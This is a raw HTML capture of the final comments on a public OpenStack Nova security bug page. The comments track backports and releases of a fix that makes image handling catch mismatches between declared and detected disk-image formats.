                  " data-baseurl="/nova/+bug/2071734/comments/102" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-26T13:14:29.929555+00:00" title="2024-07-26 13:14:29 UTC">on 2024-07-26</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/102">
                <strong>Fix proposed to nova (unmaintained/zed)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/102"> #102</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/zed<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925018">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925018</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/zed
Review: https://review.opendev.org/c/openstack/nova/+/925018</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/103" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-30T17:37:26.138094+00:00" title="2024-07-30 17:37:26 UTC">on 2024-07-30</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/103">
                <strong>Fix merged to nova (unmaintained/zed)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/103"> #103</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925018">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925018</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/a54125212ff923d055e8efc7d4f2992b0f934679">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />a54125212ff923d<wbr />055e8efc7d4f299<wbr />2b0f934679</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/zed</p>
<p>commit a54125212ff923d<wbr />055e8efc7d4f299<wbr />2b0f934679<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 45d948938314997<wbr />ba400a5fc2bb48b<wbr />c821c260ab)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit fbe429051e1fbcd<wbr />494c71525870651<wbr />e92e121449)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/925018
Committed: https://opendev.org/openstack/nova/commit/a54125212ff923d055e8efc7d4f2992b0f934679
Submitter: "Zuul (22348)"
Branch:    unmaintained/zed

commit a54125212ff923d055e8efc7d4f2992b0f934679
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
    (cherry picked from commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f)
    (cherry picked from commit 8ef5ec9716c9edbd662ca27b6e39b7848b14f492)
    (cherry picked from commit 45d948938314997ba400a5fc2bb48bc821c260ab)
    (cherry picked from commit fbe429051e1fbcd494c71525870651e92e121449)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-zed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/104" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-02T13:27:17.335707+00:00" title="2024-08-02 13:27:17 UTC">on 2024-08-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/104">
                <strong>Fix proposed to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/104"> #104</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/yoga<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925595">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925595</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/yoga
Review: https://review.opendev.org/c/openstack/nova/+/925595</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/105" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-08T14:12:56.404880+00:00" title="2024-08-08 14:12:56 UTC">on 2024-08-08</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/105">
                <strong>Fix included in openstack/nova 29.2.0</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/105"> #105</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 29.2.0  release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 29.2.0  release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/106" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-09T14:30:00.720346+00:00" title="2024-08-09 14:30:00 UTC">on 2024-08-09</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/106">
                <strong>Fix included in openstack/nova 28.3.0</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/106"> #106</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 28.3.0  release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 28.3.0  release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/107" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-08-09T14:34:17.317877+00:00" title="2024-08-09 14:34:17 UTC">on 2024-08-09</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/107">
                <strong>Fix included in openstack/nova 27.5.0</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/107"> #107</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 27.5.0  release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 27.5.0  release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/108" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-12T12:29:57.777332+00:00" title="2024-09-12 12:29:57 UTC">on 2024-09-12</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/108">
                <strong>Fix merged to nova (unmaintained/yoga)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/108"> #108</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Reviewed:  <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/925595">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/925595</a><br />
Committed: <a rel="nofollow" href="https://opendev.org/openstack/nova/commit/13a6768af4e9400a6af35f7b130dd6b66c5a02dd">https:/<wbr />/opendev.<wbr />org/openstack/<wbr />nova/commit/<wbr />13a6768af4e9400<wbr />a6af35f7b130dd6<wbr />b66c5a02dd</a><br />
Submitter: &quot;Zuul (22348)&quot;<br />
Branch:    unmaintained/yoga</p>
<p>commit 13a6768af4e9400<wbr />a6af35f7b130dd6<wbr />b66c5a02dd<br />
Author: Dan Smith &lt;email address hidden&gt;<br />
Date:   Wed Jul 10 14:23:33 2024 +0100</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Change force_format strategy to catch mismatches</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;When we moved the qemu-img command in fetch_to_raw() to force the<br />
&nbsp;&nbsp;&nbsp;&nbsp;format to what we expect, we lost the ability to identify and react<br />
&nbsp;&nbsp;&nbsp;&nbsp;to situations where qemu-img detected a file as a format that is not<br />
&nbsp;&nbsp;&nbsp;&nbsp;supported by us (i.e. identfied and safety-checked by<br />
&nbsp;&nbsp;&nbsp;&nbsp;format_<wbr />inspector)<wbr />. In the case of some of the other VMDK variants<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we don&#x27;t support, we need to be sure to catch any case where<br />
&nbsp;&nbsp;&nbsp;&nbsp;qemu-img thinks it&#x27;s something other than raw when we think it is,<br />
&nbsp;&nbsp;&nbsp;&nbsp;which will be the case for those formats we don&#x27;t support.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Note this also moves us from explicitly using the format_inspector<br />
&nbsp;&nbsp;&nbsp;&nbsp;that we&#x27;re told by glance is appropriate, to using our own detection.<br />
&nbsp;&nbsp;&nbsp;&nbsp;We assert that we agree with glance and as above, qemu agrees with<br />
&nbsp;&nbsp;&nbsp;&nbsp;us. This helps us avoid cases where the uploader lies about the<br />
&nbsp;&nbsp;&nbsp;&nbsp;image format, causing us to not run the appropriate safety check.<br />
&nbsp;&nbsp;&nbsp;&nbsp;AMI formats are a liability here since we have a very hard time<br />
&nbsp;&nbsp;&nbsp;&nbsp;asserting what they are and what they will be detected as later in<br />
&nbsp;&nbsp;&nbsp;&nbsp;the pipeline, so there is still special-casing for those.</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;Closes-Bug: #2071734<br />
&nbsp;&nbsp;&nbsp;&nbsp;Change-Id: I4b792c5bc959a9<wbr />04854c21565682e<wbr />d3a687baa1a<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8b4c522f6699514<wbr />e7d1f20ac25cf42<wbr />6af6ea588f)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 8ef5ec9716c9edb<wbr />d662ca27b6e39b7<wbr />848b14f492)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit 45d948938314997<wbr />ba400a5fc2bb48b<wbr />c821c260ab)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit fbe429051e1fbcd<wbr />494c71525870651<wbr />e92e121449)<br />
&nbsp;&nbsp;&nbsp;&nbsp;(cherry picked from commit a54125212ff923d<wbr />055e8efc7d4f299<wbr />2b0f934679)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Reviewed:  https://review.opendev.org/c/openstack/nova/+/925595
Committed: https://opendev.org/openstack/nova/commit/13a6768af4e9400a6af35f7b130dd6b66c5a02dd
Submitter: "Zuul (22348)"
Branch:    unmaintained/yoga

commit 13a6768af4e9400a6af35f7b130dd6b66c5a02dd
Author: Dan Smith &lt;dansmith@redhat.com&gt;
Date:   Wed Jul 10 14:23:33 2024 +0100

    Change force_format strategy to catch mismatches
    
    When we moved the qemu-img command in fetch_to_raw() to force the
    format to what we expect, we lost the ability to identify and react
    to situations where qemu-img detected a file as a format that is not
    supported by us (i.e. identfied and safety-checked by
    format_inspector). In the case of some of the other VMDK variants
    that we don't support, we need to be sure to catch any case where
    qemu-img thinks it's something other than raw when we think it is,
    which will be the case for those formats we don't support.
    
    Note this also moves us from explicitly using the format_inspector
    that we're told by glance is appropriate, to using our own detection.
    We assert that we agree with glance and as above, qemu agrees with
    us. This helps us avoid cases where the uploader lies about the
    image format, causing us to not run the appropriate safety check.
    AMI formats are a liability here since we have a very hard time
    asserting what they are and what they will be detected as later in
    the pipeline, so there is still special-casing for those.
    
    Closes-Bug: #2071734
    Change-Id: I4b792c5bc959a904854c21565682ed3a687baa1a
    (cherry picked from commit 8b4c522f6699514e7d1f20ac25cf426af6ea588f)
    (cherry picked from commit 8ef5ec9716c9edbd662ca27b6e39b7848b14f492)
    (cherry picked from commit 45d948938314997ba400a5fc2bb48bc821c260ab)
    (cherry picked from commit fbe429051e1fbcd494c71525870651e92e121449)
    (cherry picked from commit a54125212ff923d055e8efc7d4f2992b0f934679)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: in-unmaintained-yoga
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/109" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-17T15:48:45.231629+00:00" title="2024-09-17 15:48:45 UTC">on 2024-09-17</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/109">
                <strong>Fix proposed to nova (unmaintained/xena)</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/109"> #109</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fix proposed to branch: unmaintained/xena<br />
Review: <a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/929677">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/929677</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fix proposed to branch: unmaintained/xena
Review: https://review.opendev.org/c/openstack/nova/+/929677</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/110" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~hudson-openstack" class="sprite person">OpenStack Infra (hudson-openstack)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-09-20T08:14:33.567315+00:00" title="2024-09-20 08:14:33 UTC">on 2024-09-20</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/nova/+bug/2071734/comments/110">
                <strong>Fix included in openstack/nova 30.0.0.0rc1</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/110"> #110</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This issue was fixed in the openstack/nova 30.0.0.0rc1  release candidate.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This issue was fixed in the openstack/nova 30.0.0.0rc1  release candidate.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/nova/+bug/2071734/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
        
          <div class="informational message comments-hidden-message">
            Displaying first 40
            and last 40
            comments.
            
              <a class="show-comments-link" href="/nova/+bug/2071734?comments=all">
                View all 110
                comments</a> or <a href="/nova/+bug/2071734?comments=all">add a comment</a>.
            
          </div>
            
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/nova/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    
    
    
    
    
    
    
  </ul>
  <ul id="lock-status-actions">
    
  </ul>
</div>

      

      <div class="portlet vertical" id="portlet-subscription">
  <div class="section">
    <div id="current_user_subscription" class="False">
      
        <span>You are</span>
        
        <a class="menu-link-subscription sprite modify edit" href="/nova/+bug/2071734/+subscribe">
           
           
           
           not directly subscribed to this bug's notifications.
        </a>
      
      
    </div>
    <div id="sub-unsub-spinner">Subscribing...</div>
    <ul>
      
      <li><a class="menu-link-editsubscriptions sprite modify edit" href="https://bugs.launchpad.net/nova/+bug/2071734/+subscriptions" title="View and change your subscriptions to this bug">Edit bug mail</a></li>
    </ul>
  </div>
  <script type="text/javascript">
    LPJS.use('io-base', 'node',
            'lp.bugs.bugtask_index.portlets.subscription', function(Y) {
        Y.on('domready', function() {
            Y.lp.bugs.bugtask_index.portlets.subscription.initialize();
        });
    });
  </script>
</div>

